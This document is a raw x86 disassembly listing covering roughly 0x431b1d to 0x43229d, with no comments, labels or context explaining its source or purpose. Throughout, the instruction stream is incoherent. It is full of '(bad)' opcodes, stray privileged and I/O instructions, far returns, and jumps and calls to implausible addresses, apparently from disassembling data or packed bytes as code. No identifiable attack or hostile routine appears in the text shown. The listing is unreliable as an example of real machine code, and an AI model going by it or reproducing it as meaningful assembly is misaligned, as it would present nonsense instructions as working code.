  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
  431ce9:	or     BYTE PTR [ecx+ebx*1],cl
  431cec:	push   ebp
  431ced:	inc    ebp
  431cee:	in     al,dx
  431cef:	add    ebp,esp
  431cf1:	or     bh,al
  431cf3:	dec    ebp
  431cf4:	cld    
  431cf5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431cfb:	xor    DWORD PTR [edx],0x2
  431cfe:	pushf  
  431cff:	dec    DWORD PTR [ebx+0x45510cf4]
  431d05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d0b:	mov    edx,DWORD PTR [ecx+0xc]
  431d0e:	xor    eax,esi
  431d10:	mov    edx,0xc172c7
  431d15:	inc    ebp
  431d16:	mov    esi,DWORD PTR [ebp+0x8]
  431d19:	mov    eax,edx
  431d1b:	call   0x84c7e410
  431d20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d26:	mov    ebp,eax
  431d28:	or     BYTE PTR [eax],dl
  431d2a:	jo     0x431d79
  431d2c:	push   edi
  431d2d:	xor    esi,DWORD PTR [ebp+0x3]
  431d30:	(bad)  
  431d31:	pmulhuw mm0,mm1
  431d34:	test   DWORD PTR [ebp-0x8],ecx
  431d37:	mov    DWORD PTR [ebp-0x67],eax
  431d3a:	mov    eax,DWORD PTR [ebp-0x4]
  431d3d:	xor    edi,DWORD PTR [ebp-0x73]
  431d40:	xor    eax,DWORD PTR [ebx]
  431d42:	xor    esi,DWORD PTR [edx+0x3]
  431d45:	add    BYTE PTR [ecx],bh
  431d47:	inc    ebp
  431d48:	(bad)  
  431d49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d4f:	mov    DWORD PTR [eax],0x750f0004
  431d55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d5b:	lock add BYTE PTR [ebp+0x0],cl
  431d5f:	mov    esi,DWORD PTR [ebp-0x18]
  431d62:	mov    ebp,edx
  431d64:	or     al,0x72
  431d66:	ja     0x431d68
  431d68:	mov    edx,esi
  431d6a:	cld    
  431d6b:	(bad)  
  431d6e:	cli    
  431d6f:	mov    esi,DWORD PTR [ebp-0x4]
  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
